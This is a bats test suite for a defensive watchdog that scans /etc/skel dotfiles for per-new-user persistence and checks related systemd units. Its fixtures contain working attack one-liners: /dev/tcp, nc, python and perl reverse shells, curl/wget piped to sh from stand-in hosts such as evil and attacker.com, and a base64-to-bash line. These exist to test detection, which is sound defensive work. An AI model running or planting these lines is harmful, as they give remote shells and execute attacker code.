#!/usr/bin/env bats
# L2 bats functional tests for the skel-watchdog scan script.
#
# /etc/skel is copied into every NEW user's home at account creation, so a
# planted dotfile (.bashrc, .profile, …) becomes the login-shell rc of every
# future user — delayed, per-new-user code execution (T1546.004 family). A
# skel file that is world-writable / non-root-owned, or contains a
# command-injection pattern, is alert. The scan recurses (find -type f), so
# hidden dotfiles are covered.
#
# Run with: bats packaging/test/L2-skel-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/skel-watchdog/systemd/skel-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    SKELD="${TMP}/skel"; mkdir -p "${SKELD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_SKEL_PROFILE="${PROFILE:-report}" \
    SELFDEF_SKEL_BASELINE="${BASELINE}" \
    SELFDEF_SKEL_DIRS="${DIRS_V:-$SKELD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '# .bashrc\nexport PATH="$PATH:/usr/local/bin"\n' > "${SKELD}/.bashrc"
}

@test "no skel dir → ok / no_skel" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_skel"'
    cap | grep -q '"severity":"ok"'
}

@test "benign skel dotfile, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged skel on second run → ok / skel_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"skel_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a skel dotfile with an injection pattern → alert / skel_suspicious" {
    seed_benign
    run_wd
    printf '# .bashrc\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"skel_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable skel dotfile → alert" {
    seed_benign
    run_wd
    chmod 0666 "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign skel change → warn / skel_changed" {
    seed_benign
    run_wd
    printf '# .bashrc\nexport PATH="$PATH:/usr/local/sbin"\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"skel_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned skel dotfile is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious skel dotfile" {
    seed_benign
    run_wd
    printf '# .bashrc\ncurl http://evil/p|sh\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — skel inventory enumerates new-user-rc-template surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in skel dotfile → alert" {
    seed_benign
    run_wd
    printf '# .bashrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in skel dotfile → alert" {
    seed_benign
    run_wd
    printf '# .bashrc\nwget -qO- http://attacker/p | sh\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in skel dotfile → alert" {
    seed_benign
    run_wd
    printf '# .bashrc\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable skel dotfile): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable skel dotfile): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${SKELD}/.bashrc"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (recursion into subdir): hidden dotfile in skel subdir is scanned (find -type f recurses)" {
    seed_benign
    mkdir -p "${SKELD}/.config"
    printf '# config-init\nbash -i >& /dev/tcp/9.9.9.9/4444 0>&1\n' > "${SKELD}/.config/init"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "DELTA detect — ADDED skel dotfile (attacker drops a new .profile) surfaces in sample" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# distinctive-attacker\necho new\n' > "${SKELD}/.distinctive-attacker-profile"
    run_wd
    cap | grep -q 'distinctive-attacker'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-skel -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): skel-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    # T1546.004 per-new-user code-execution persistence — alert MUST
    # persist across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '# .bashrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${SKELD}/.bashrc"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"skel_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# .bashrc\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nexport PATH="$PATH:/usr/local/bin"\n' > "${SKELD}/.bashrc"
    run_wd
    ! cap | grep -q '"event":"skel_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /etc/skel + /etc/skel.alt axes — injection in EITHER → alert)" {
    SKELD2="${TMP}/skel.alt"; mkdir -p "${SKELD2}"
    seed_benign
    DIRS_V="${SKELD} ${SKELD2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# .bashrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${SKELD2}/.bashrc"
    DIRS_V="${SKELD} ${SKELD2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# .bashrc\ncurl -s http://attacker.com/p | bash\n' > "${SKELD}/.bashrc"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in skel dotfile: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
    # grub-config/initramfs-hooks/kernel-install-hooks/motd-scripts/
    # needrestart-hooks/pm-utils-hooks/resolvconf-hooks nc reverse-shell
    # variant INVARIANTs across the brain. Lock the netcat axis on the
    # /etc/skel per-new-user-rc-template persistence surface (T1546.004
    # — skel dotfiles become the login-shell rc of every future user).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# .bashrc\nnc -e /bin/sh 1.1.1.1 4444\n' > "${SKELD}/.bashrc"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on skel dotfile surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the /etc/skel
    # per-new-user-rc-template persistence surface (T1546.004 —
    # skel dotfiles become the login-shell rc of every future
    # user; every new account created via useradd copies skel
    # into ~/.bashrc + ~/.profile + ~/.zshrc).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# .bashrc\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${SKELD}/.bashrc"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on skel dotfile surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp skel-dotfile
    # variants. Perl on every Debian/Ubuntu. Locks perl axis on
    # T1546.004 skel per-new-user persistence surface.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# .bashrc\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${SKELD}/.bashrc"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (exec-path under writable-root: skel dotfile invoking binary from /tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1546.004
    # skel per-new-user persistence — when a new user is added,
    # /etc/skel/* is copied into their home; any payload there
    # runs AS that user on first login. Beyond inline reverse-
    # shell payloads, attackers stage benign-looking skel
    # dotfiles that invoke a binary in writable-root.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# .bashrc\n/tmp/staged_payload\n' > "${SKELD}/.bashrc"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on skel surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The skel-watchdog MUST only emit severity values from the
    # closed set {ok,warn,alert} — never custom values (critical,
    # error, fatal, notice, info). Operator dashboard parsers
    # branch on the literal severity string; an out-of-set value
    # silently falls through routing and the operator never sees
    # the T1546.004 skel per-new-user persistence alert. Locks
    # parser contract on the new-user-template substrate.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok path
    printf '# .bashrc\n/dev/tcp/1.1.1.1/4444\n' > "${SKELD}/.bashrc"
    run_wd                                              # alert path
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: skel-watchdog NEVER deletes /etc/skel files — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # skel-watchdog DETECTS T1546.004 skel per-new-user
    # persistence via injection but MUST NEVER emit rm/unlink
    # commands to auto-clean the file. The detected injection
    # may be operator-legitimate (custom .bashrc PATH export,
    # site-specific umask in .profile, tooling activation in
    # .bash_profile) — silent auto-delete would destroy
    # operator baseline state AND forensic evidence chain.
    # Surveillance, never remediation. Locks anti-data-loss
    # contract on the skel surveillance substrate.
    seed_benign
    printf '# .bashrc\n/dev/tcp/1.1.1.1/4444\n' > "${SKELD}/.bashrc"
    run_wd
    [ -f "${SKELD}/.bashrc" ]
    ! grep -qE 'find[[:space:]].*-delete' "${WD}"
    ! grep -qE 'rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(SKELD|SKEL|FILE|file)' "${WD}"
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # skel-watchdog runs ON the timer's scheduled fire — scans
    # /etc/skel for injection patterns in new-user dotfiles,
    # emits a verdict, then exits. Type=simple would break
    # timer OnUnitActiveSec semantics. Locks oneshot-probe
    # contract on the skel-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/skel-watchdog/systemd/selfdef-skel.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. skel-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # skel-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # skel-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/skel-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'skel-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: skel-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. skel-watchdog is a DETECT-only watchdog: surveils +
    # emits verdicts, NEVER writes back. Locks no-auto-fix on
    # the skel-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/skel-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (skel-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # Locks set -u discipline on the skel-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/skel-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (skel-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # Locks SDD-062 logger-tag routing discipline on the
    # skel-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/skel-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (skel-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # Locks anti-thundering-herd cadence discipline on the
    # skel-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/skel-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (skel-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Locks Persistent= discipline on the skel-watchdog timer
    # substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/skel-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (skel-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # Locks timer-to-service binding discipline on the
    # skel-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/skel-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (skel-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. Locks the service-to-libexec binding discipline
    # on the skel-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/skel-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (skel-watchdog service does NOT declare Restart=always — anti-restart-storm contract on oneshot probe)" {
    # Sister to brain-wide oneshot-probe INVARIANT family.
    # Locks anti-restart-storm discipline on the skel-watchdog
    # service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/skel-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        ! grep -qE '^Restart=always' "${s}"
        ! grep -qE '^Restart=on-failure' "${s}"
    done
}

@test "INVARIANT (skel-watchdog service unit declares Description= — systemctl-status operator-readable label)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Locks Description-present discipline on the
    # skel-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/skel-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Description=' "${s}"
    done
}

@test "INVARIANT (skel-watchdog service unit declares TimeoutStartSec= — anti-hang oneshot bound contract)" {
    # Sister to brain-wide TimeoutStartSec= INVARIANT family.
    # Watchdog .service units are Type=oneshot probes — they
    # MUST declare a TimeoutStartSec= upper bound so systemd
    # kills a hung probe (e.g. a stuck sha256sum on a slow
    # NFS-mounted target file) rather than blocking the
    # next timer fire indefinitely. Without TimeoutStartSec=
    # systemd's default (90s) applies, but the canonical
    # selfdef contract pins this explicitly per watchdog so
    # operators reading the .service know the bound at a
    # glance. A regression that dropped TimeoutStartSec=
    # would silently revert to the systemd default + mask
    # the explicit-bound contract. Locks anti-hang oneshot-
    # bound discipline on the skel-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/skel-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^TimeoutStartSec=' "${s}"
    done
}

@test "INVARIANT (skel-watchdog service unit declares Nice= — idle-priority anti-resource-starve contract)" {
    # Sister to brain-wide systemd resource-priority INVARIANT
    # family. Watchdog .service units run periodic scans (often
    # sha256sum walks of large config trees) — they MUST be
    # deprioritized via Nice= (positive value = lower priority
    # under load) so that the watchdog scan doesn't starve
    # operator-foreground workloads when CPU is contended.
    # The canonical selfdef value is Nice=15 (well above the
    # background-batch threshold of 10). A regression dropping
    # Nice= would let watchdog scans compete with foreground at
    # default Nice=0, surfacing as latency spikes on contended
    # hosts. Locks the idle-priority anti-resource-starve
    # discipline on the skel-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/skel-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Nice=' "${s}"
    done
}
